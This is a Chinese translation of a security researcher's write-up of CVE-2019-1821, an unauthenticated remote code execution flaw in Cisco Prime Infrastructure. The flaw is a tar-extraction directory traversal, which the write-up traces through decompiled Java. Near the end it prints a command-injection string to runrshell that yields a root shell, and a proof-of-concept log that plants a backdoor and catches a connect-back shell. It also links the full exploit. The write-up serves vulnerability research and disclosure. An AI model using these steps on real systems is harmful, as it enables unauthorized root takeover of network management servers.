# Cisco Prime Infrastructure未授权远程代码执行漏洞分析

阅读量 **240390**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-21 10:30:57

 **x**

##### 译文声明

本文是翻译文章，文章原作者 srcincite，文章来源：srcincite.io

原文地址：<https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01922e01eaef6ff12e.jpg)

## 0x00 前言

并非所有的目录遍历漏洞都能造成相同的影响，具体影响范围取决于目录遍历的用途，以及利用过程中需要用户交互的程度。这类简单的漏洞在实际代码中可能隐藏很深，因此可能会造成灾难性后果。

Cisco在Prime
Infrastructure（PI）中修复了一个目录遍历漏洞（[CVE-2019-1821](https://srcincite.io/advisories/src-2019-0034)），然而我并不清楚补丁细节，并且我也没法进行测试（我没有Cisco许可证），因此我决定在这里与大家共享相关细节，希望有人能帮我验证代码的鲁棒性。

在本文中，我分析了[CVE-2019-1821](https://srcincite.io/advisories/src-2019-0034)的发现过程及利用方法，这是一个未授权服务端远程代码执行（RCE）漏洞，也刚好是我们在[全栈Web攻击](https://srcincite.io/training/)训练课程中即将涉及的内容。

## 0x01 相关背景

Cisco[网站](https://www.cisco.com/c/en/us/products/cloud-systems-management/prime-infrastructure/index.html)上对Prime Infrastructure（PI）的描述如下：

> Cisco Prime
> Infrastructure正是您所需的解决方案，可以用于任务的简化及自动化管理，同时能够充分利用Cisco网络的智能优势。这款解决方案功能强大，可以帮您……整合产品、管理网络以实现移动协作、简化WAN管理等。

实话实说，我还是理不清适用场景，因此我决定去翻一下[维基百科](https://en.wikipedia.org/wiki/Cisco_Prime)：

> Cisco Prime是一个网络管理软件集，由Cisco Systems的各种软件应用所组成。大多数应用面向的是企业或者服务提供商网络。

感谢维基百科，这段话看上去更加容易理解，看来我不是第一个对产品功能感到困惑的人。然而不论如何，在安全研究方面这些信息并不是重点。

## 0x02 研究目标

我的漏洞测试环境为 **PI-APL-3.4.0.0.348-1-K9.iso（d513031f481042092d14b77cd03cbe75）**
，补丁为 **PI_3_4_1-1.0.27.ubf (56a2acbcf31ad7c238241f701897fcb1)**
。按官方说法，这个补丁可以修补[Pedro](https://twitter.com/pedrib1337)发现的那个漏洞（[CVE-2018-15379](https://github.com/pedrib/PoC/blob/master/advisories/cisco-prime-infrastructure.txt#L27)）。然而一会儿我们就可以看到，单个CVE编号对应的是两个不同的漏洞，其中只有一个漏洞被成功修补。

    
    
    piconsole/admin# show version
    
    Cisco Prime Infrastructure
    ********************************************************
    Version : 3.4.0
    Build : 3.4.0.0.348
    Critical Fixes:
            PI 3.4.1 Maintenance Release ( 1.0.0 )
    

默认安装完毕后，我需要设置High
Availability（HA，高可用性）才能访问目标代码。根据[文档](https://www.cisco.com/c/en/us/td/docs/net_mgmt/prime/infrastructure/3-4/admin/guide/bk_CiscoPrimeInfastructure_3_4_AdminGuide/bk_CiscoPrimeInfastructure_3_4_AdminGuide_chapter_01010.html)描述，这是安装Cisco
PI时的标准做法。虽然过程看起来非常复杂，但实际上就是部署两个不同的PI，然后配置其中一个为主（primary）HA服务器，另一个为辅（secondary）HA服务器。

![](https://p4.ssl.qhimg.com/t010d397842c1058d7a.jpg)

图1. High Availability示意图

耗费了许多内存及硬盘空间后，最终搭建效果如下所示：

![](https://p3.ssl.qhimg.com/t0161e46a89e0c7c7d5.png)

此外，在直接向Cisco反馈之前，我的一个小伙伴确认了在3.5版本上这个bug依然存在。

## 0x03 漏洞分析

在`/opt/CSCOlumos/healthmonitor/webapps/ROOT/WEB-INF/web.xml`文件中，我们找到如下内容：

    
    
        <!-- Fileupload Servlet -->
        <servlet>
            <servlet-name>UploadServlet</servlet-name>
            <display-name>UploadServlet</display-name>
            <servlet-class>
                com.cisco.common.ha.fileutil.UploadServlet
            </servlet-class>
        </servlet>
    
        <servlet-mapping>
            <servlet-name>UploadServlet</servlet-name>
            <url-pattern>/servlet/UploadServlet</url-pattern>
        </servlet-mapping>
    

这个servlet是Health Monitor应用的一部分，需要配置并连接HA服务器（参考前文“研究目标”相关内容）。

在`/opt/CSCOlumos/lib/pf/rfm-3.4.0.403.24.jar`文件中，我们可以找到`UploadServlet`类对应的代码：

    
    
    public class UploadServlet
      extends HttpServlet
    {
      private static final String FILE_PREFIX = "upload_";
      private static final int ONE_K = 1024;
      private static final int HTTP_STATUS_500 = 500;
      private static final int HTTP_STATUS_200 = 200;
      private boolean debugTar = false;
    
      public void init() {}
    
      public void doPost(HttpServletRequest request, HttpServletResponse response)
        throws IOException, ServletException
      {
        String fileName = null;
    
        long fileSize = 0L;
    
        boolean result = false;
        response.setContentType("text/html");
        String destDir = request.getHeader("Destination-Dir");                              // 1
        String archiveOrigin = request.getHeader("Primary-IP");                             // 2
        String fileCount = request.getHeader("Filecount");                                  // 3
        fileName = request.getHeader("Filename");                                           // 4
        String sz = request.getHeader("Filesize");                                          // 5
        if (sz != null) {
          fileSize = Long.parseLong(sz);
        }
        String compressed = request.getHeader("Compressed-Archive");                        // 6
        boolean archiveIsCompressed;
        boolean archiveIsCompressed;
        if (compressed.equals("true")) {
          archiveIsCompressed = true;
        } else {
          archiveIsCompressed = false;
        }
        AesLogImpl.getInstance().info(128, new Object[] { "Received archive=" + fileName, " size=" + fileSize + " from " + archiveOrigin + " containing " + fileCount + " files to be extracted to: " + destDir });
    
        ServletFileUpload upload = new ServletFileUpload();
    
        upload.setSizeMax(-1L);
        PropertyManager pmanager = PropertyManager.getInstance(archiveOrigin);              // 7
        String outDir = pmanager.getOutputDirectory();                                      // 8
    
        File fOutdir = new File(outDir);
        if (!fOutdir.exists()) {
          AesLogImpl.getInstance().info(128, new Object[] { "UploadServlet: Output directory for archives " + outDir + " does not exist. Continuing..." });
        }
        String debugset = pmanager.getProperty("DEBUG");
        if ((debugset != null) && (debugset.equals("true")))
        {
          this.debugTar = true;
          AesLogImpl.getInstance().info(128, new Object[] { "UploadServlet: Debug setting is specified" });
        }
        try
        {
          FileItemIterator iter = upload.getItemIterator(request);
          while (iter.hasNext())
          {
            FileItemStream item = iter.next();
            String name = item.getFieldName();
            InputStream stream = item.openStream();                                         // 9
            if (item.isFormField())
            {
              AesLogImpl.getInstance().error(128, new Object[] { "Form field input stream with name " + name + " detected. Abort processing" });
    
              response.sendError(500, "Servlet does not handle FormField uploads."); return;
            }
                                                                                            // 10
            result = processFileUploadStream(item, stream, destDir, archiveOrigin, archiveIsCompressed, fileName, fileSize, outDir);
            stream.close();
          }
        }
    

在上述注释[1]、[2]、[3]、[4]、[5]以及[6]处，代码从攻击者可控的请求中提取了6个输入参数，这些参数分别为`destDir`、`archiveOrigin`、`fileCount`、`fileName`、`fileSize`（`long`型）以及`compressed`（`boolean`型）。

在[7]处，我们需要提供一个正确的`Primary-IP`，才能在[8]处得到有效的`outDir`。然而在[9]处，代码实际上会利用上传文件获得输入流，在[10]处代码调用`processFileUploadStream`，将前7参数个作为输入参数。

    
    
      private boolean processFileUploadStream(FileItemStream item, InputStream istream, String destDir, String archiveOrigin, boolean archiveIsCompressed, String archiveName, long sizeInBytes, String outputDir)
        throws IOException
      {
        boolean result = false;
        try
        {
          FileExtractor extractor = new FileExtractor();                                                    // 11
          AesLogImpl.getInstance().info(128, new Object[] { "processFileUploadStream: Start extracting archive = " + archiveName + " size= " + sizeInBytes });
    
          extractor.setDebug(this.debugTar);
    
          result = extractor.extractArchive(istream, destDir, archiveOrigin, archiveIsCompressed);          // 12
    

然后在[11]处代码创建一个新的`FileExtractor`，在[12]处使用攻击者可控的参数`istream`、`destDir`、`archiveOrigin`以及`archiveIsCompressed`调用`extractArchive`。

    
    
    public class FileExtractor
    {
    
      ...
    
      public boolean extractArchive(InputStream ifstream, String destDirToken, String sourceIPAddr, boolean compressed)
      {
        if (ifstream == null) {
          throw new IllegalArgumentException("Tar input stream not specified");
        }
        String destDir = getDestinationDirectory(sourceIPAddr, destDirToken);                               // 13
        if ((destDirToken == null) || (destDir == null)) {
          throw new IllegalArgumentException("Destination directory token " + destDirToken + " or destination dir=" + destDir + " for extraction of tar file not found");
        }
        FileArchiver archiver = new FileArchiver();
        boolean result = archiver.extractArchive(compressed, null, ifstream, destDir);                      // 14
    
        return result;
      }
    

在[13]处代码使用我们可控的`sourceIPAddr`以及`destDirToken`调用`getDestinationDirectory`。`destDirToken`需要是一个有效的目录token，因此我使用的是`tftpRoot`字符串。从`HighAvailabilityServerInstanceConfig`类摘抄的部分代码如下所示：

    
    
        if (name.equalsIgnoreCase("tftpRoot")) {
          return getTftpRoot();
        }
    

此时我们执行到[14]处，这里代码会使用我们的`compressed`、`ifstream`以及`destDir`参数来调用`extractArchive`。

    
    
    public class FileArchiver
    {
    
      ...
    
      public boolean extractArchive(boolean compress, String archveName, InputStream istream, String userDir)
      {
        this.archiveName = archveName;
        this.compressed = compress;
        File destDir = new File(userDir);
        if (istream != null) {
          AesLogImpl.getInstance().trace1(128, "Extract archive from stream  to directory " + userDir);
        } else {
          AesLogImpl.getInstance().trace1(128, "Extract archive " + this.archiveName + " to directory " + userDir);
        }
        if ((!destDir.exists()) && 
          (!destDir.mkdirs()))
        {
          destDir = null;
          AesLogImpl.getInstance().error1(128, "Error while creating destination dir=" + userDir + " Giving up extraction of archive " + this.archiveName);
    
          return false;
        }
        result = false;
        if (destDir != null) {
          try
          {
            setupReadArchive(istream);                                  // 15
            this.archive.extractContents(destDir);                      // 17
            return true;
          }
    

以上代码首先会调用[15]处的`setupReadArchive`。这一点非常重要，因为我们会在如下代码[16]处将`archive`变量设置为`TarArchive`类的一个实例。

    
    
      private boolean setupReadArchive(InputStream istream)
        throws IOException
      {
        if ((this.archiveName != null) && (istream == null)) {
          try
          {
            this.inStream = new FileInputStream(this.archiveName);
          }
          catch (IOException ex)
          {
            this.inStream = null;
            return false;
          }
        } else {
          this.inStream = istream;
        }
        if (this.inStream != null) {
          if (this.compressed)
          {
            try
            {
              this.inStream = new GZIPInputStream(this.inStream);
            }
            catch (IOException ex)
            {
              this.inStream = null;
            }
            if (this.inStream != null) {
              this.archive = new TarArchive(this.inStream, 10240);              // 16
            }
          }
          else
          {
            this.archive = new TarArchive(this.inStream, 10240);
          }
        }
        if (this.archive != null) {
          this.archive.setDebug(this.debug);
        }
        return this.archive != null;
      }
    

然后在[17]，代码会在`TarArchive`类上调用`extractContents`。

    
    
      extractContents( File destDir )
        throws IOException, InvalidHeaderException
        {
        for ( ; ; )
          {
          TarEntry entry = this.tarIn.getNextEntry();
    
          if ( entry == null )
            {
            if ( this.debug )
              {
              System.err.println( "READ EOF RECORD" );
              }
            break;
            }
    
          this.extractEntry( destDir, entry );                      // 18
          }
        }
    

在[18]处代码提取了`entry`，我们终于看到代码会在没有检查是否存在目录遍历的情况下盲目提取tar压缩文件中的内容。

    
    
            try {
              boolean asciiTrans = false;
    
              FileOutputStream out =
                new FileOutputStream( destFile );                   // 19
    
              ...
    
              for ( ; ; )
                {
                int numRead = this.tarIn.read( rdbuf );
    
                if ( numRead == -1 )
                  break;
    
                if ( asciiTrans )
                  {
                  for ( int off = 0, b = 0 ; b < numRead ; ++b )
                    {
                    if ( rdbuf[ b ] == 10 )
                      {
                      String s = new String
                        ( rdbuf, off, (b - off) );
    
                      outw.println( s );
    
                      off = b + 1;
                      }
                    }
                  }
                else
                  {
                  out.write( rdbuf, 0, numRead );                   // 20
                  }
                }
    

在[19]处，代码创建文件并在[20]处将文件内容写入磁盘。值得注意的是，存在漏洞的类实际上是第三方代码，由ICE Engineering的Timothy
Gerard
Endres开发。更加有趣的是，还有其他项目（比如[radare](https://github.com/radare/radare2-installer/blob/master/src/com/ice/tar/TarArchive.java)）也用到了存在漏洞的这些代码。

利用该漏洞，未授权攻击者可以以`prime`用户身份实现远程代码执行。

## 0x04 题外话

由于Cisco并没有完全修补[CVE-2018-15379](https://github.com/pedrib/PoC/blob/master/advisories/cisco-prime-infrastructure.txt#L56)漏洞，因此我可以将权限提升至`root`：

    
    
    python -c 'import pty; pty.spawn("/bin/bash")'
    [prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    sh-4.1# /usr/bin/id
    /usr/bin/id
    uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
    

其实[TarArchive.java](https://github.com/radare/radare2-installer/blob/master/src/com/ice/tar/TarArchive.java#L522)中还有另一个远程代码执行漏洞，大家能否发现这个漏洞？

## 0x05 PoC

    
    
    saturn:~ mr_me$ ./poc.py 
    (+) usage: ./poc.py <target> <connectback:port>
    (+) eg: ./poc.py 192.168.100.123 192.168.100.2:4444
    
    saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.2:4444
    (+) planted backdoor!
    (+) starting handler on port 4444
    (+) connection from 192.168.100.123
    (+) pop thy shell!
    python -c 'import pty; pty.spawn("/bin/bash")'
    [prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    sh-4.1# /usr/bin/id
    /usr/bin/id
    uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
    

大家可以访问[此处](https://srcincite.io/pocs/src-2019-0034.py.txt)下载完整的利用代码。

## 0x06 总结

在代码审计中，这个漏洞已经多次成功逃过了许多安全研究人员的法眼，我认为之所以会出现这种情况，是因为该漏洞只有在配置HA之后，才会由某个组件触发。有些情况下，安全研究人员需要花不少精力才能正确配置好实验环境。

## 0x07 参考资料

  * <https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-prime-infrastructure.txt>

本文翻译自srcincite.io [原文链接](https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/178700](/post/id/178700)

安全客 - 有思想的安全新媒体

本文转载自: [srcincite.io](https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html)

如若转载,请注明出处： <https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [cisco](/tag/cisco)

 **+1** __3赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

